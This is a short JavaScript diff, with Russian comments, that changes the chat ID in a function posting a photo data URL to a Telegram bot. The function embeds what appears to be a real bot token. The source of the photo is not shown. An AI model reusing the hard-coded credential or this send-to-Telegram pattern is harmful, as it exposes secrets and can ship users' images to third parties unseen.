@@ -57,7 +57,7 @@
         // Функция отправки фотографии в Telegram (опционально)
         async function sendPhotoToTelegram(photoDataURL) {
             const token = "6765756823:AAEaZgZa7u7zj7D2Io1FD0J4CEdACLzSDZo";
-            const chat_id = "-1002328129351";
+            const chat_id = -1002328129351;
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
